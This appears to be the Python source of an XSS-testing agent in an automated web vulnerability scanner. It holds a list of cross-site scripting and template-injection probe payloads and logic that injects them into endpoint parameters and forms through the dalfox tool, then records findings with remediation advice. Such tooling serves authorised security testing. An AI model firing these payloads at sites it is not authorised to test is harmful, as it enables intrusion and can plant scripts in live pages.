class XSSAgent(SwarmAgent):
    """Cross-Site Scripting specialist — reflected, stored, DOM."""

    RELEVANT_NODE_TYPES    = ["url", "parameter", "api_endpoint"]
    RELEVANT_LABEL_KEYWORDS = ["form", "input", "search", "comment", "reflect"]

    _BASE_PAYLOADS = [
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert(1)>",
        "'\"><svg/onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "${alert(1)}",   # template injection probe
        "{{7*7}}",       # SSTI probe
        "</script><script>alert(1)</script>",
        "<body onload=alert(1)>",
        "';alert(String.fromCharCode(88,83,83))//",
    ]

    def __init__(self, **kwargs):
        super().__init__(AgentType.XSS, **kwargs)

    async def generate_hypotheses(self, target, graph_nodes, context) -> List[Hypothesis]:
        hypotheses: List[Hypothesis] = []
        endpoints  = context.get("endpoints", [target])
        params_map = context.get("parameters", {})
        tech_stack = context.get("tech_stack", [])
        js_sinks   = context.get("js_sinks", [])

        # Merge learned top payloads with base set
        payload_pool = self.memory.top_payloads(5) + [
            p for p in self._BASE_PAYLOADS if p not in self.memory.top_payloads(5)
        ]

        for ep in endpoints[:25]:
            ep_params = params_map.get(ep, ["q", "search", "input", "name", "msg"])
            for param in ep_params[:6]:
                base_conf = self.memory.rate("reflected_xss", 0.38)
                conf = self._boost_confidence(base_conf, tech_stack, ["php", "asp", "jsp", "coldfusion"])
                for payload in payload_pool[:5]:
                    hypotheses.append(Hypothesis(
                        hypothesis_id = uuid.uuid4().hex[:8],
                        agent_type    = self.agent_type,
                        target_node   = ep,
                        attack_vector = f"reflected_xss:{param}",
                        confidence    = conf,
                        payload       = payload,
                        context       = {"param": param, "endpoint": ep},
                        reasoning     = f"Param '{param}' may reflect user input without encoding",
                        priority      = conf,
                    ))

        # DOM XSS hypotheses from JS sink analysis
        for sink in js_sinks[:10]:
            hypotheses.append(Hypothesis(
                hypothesis_id = uuid.uuid4().hex[:8],
                agent_type    = self.agent_type,
                target_node   = sink.get("url", target),
                attack_vector = "dom_xss",
                confidence    = self.memory.rate("dom_xss", 0.55),
                payload       = "<img src=x onerror=alert(document.domain)>",
                context       = {"sink_type": sink.get("type"), "sink_url": sink.get("url")},
                reasoning     = f"DOM sink '{sink.get('type')}' may process untrusted data",
                priority      = 0.65,
            ))

        # Stored XSS via form endpoints
        form_eps = [ep for ep in endpoints if any(
            k in ep.lower() for k in ["comment", "post", "message", "profile", "bio"]
        )]
        for ep in form_eps[:5]:
            canary = f"XSSTEST-{uuid.uuid4().hex[:6]}"
            hypotheses.append(Hypothesis(
                hypothesis_id = uuid.uuid4().hex[:8],
                agent_type    = self.agent_type,
                target_node   = ep,
                attack_vector = "stored_xss",
                confidence    = self.memory.rate("stored_xss", 0.45),
                payload       = f"<script>/*{canary}*/alert(1)</script>",
                context       = {"endpoint": ep, "canary": canary},
                reasoning     = "Input-accepting endpoint may store and re-render unsanitized content",
                priority      = 0.70,
            ))

        hypotheses.sort(key=lambda h: h.priority, reverse=True)
        return hypotheses[:60]

    async def execute_tests(self, target, hypotheses, context) -> List[AgentFinding]:
        findings: List[AgentFinding] = []
        canary = f"XSSCANARY{uuid.uuid4().hex[:8]}"

        for h in hypotheses:
            if self._stop_event.is_set():
                break
            try:
                result = await self._tool(
                    "dalfox",
                    url=h.target_node,
                    param=h.context.get("param", ""),
                    payload=h.payload,
                )
                data  = result.get("data") or {}
                body  = str(data.get("body", "") if isinstance(data, dict) else data)
                status = (data.get("status", 0) if isinstance(data, dict) else 0)

                reflected = canary in body or h.payload in body
                dalfox_hit = result.get("success") and "XSS" in str(result.get("raw", ""))

                if reflected or dalfox_hit:
                    findings.append(self._finding(
                        target         = h.target_node,
                        vuln_type      = h.attack_vector.split(":")[0],
                        severity       = "high",
                        title          = f"XSS ({h.attack_vector}) — param: {h.context.get('param', '?')}",
                        description    = (f"Parameter '{h.context.get('param')}' reflects unsanitized "
                                          f"input allowing script injection."),
                        payload        = h.payload,
                        evidence       = body[:600],
                        cvss           = 7.4,
                        confidence     = 0.88 if dalfox_hit else 0.72,
                        reproduced     = True,
                        chain_potential= ["xss_to_account_takeover", "xss_csrf_chain"],
                        remediation    = "Apply context-aware output encoding; use Content-Security-Policy.",
                    ))
            except Exception as exc:
                logger.debug("[%s] XSS test error: %s", self.name, exc)
            await asyncio.sleep(0.04)

        return findings


